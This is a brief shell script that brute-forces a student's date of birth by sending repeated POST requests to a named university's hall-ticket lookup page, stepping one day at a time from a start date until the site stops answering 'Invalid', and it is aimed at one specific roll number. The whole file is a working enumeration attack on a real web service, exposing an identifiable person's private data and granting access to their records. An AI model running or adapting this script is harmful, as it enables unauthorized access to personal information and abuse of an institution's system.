#!/bin/sh
# USAGE: check rollno dob
check() {
 ! curl -X POST https://results.kongu.edu/hallticket/ticketo.php\
   -H "Content-Type: application/x-www-form-urlencoded"\
   -d "regno="$1"&dob=$2" -s | grep Invalid >/dev/null
}

# USAGE: find_dob rollno start_dob
find_dob(){
    i=0
    while
    	guess=$(date -d "$2 + $i day" +%d.%m.%Y)
        echo Checking "$guess" >&2
        ! check "$1" "$guess"
    do i=$((i + 1))
    done
    echo "$1's dob is $guess"
}

find_dob 21CSR055 2004/01/01
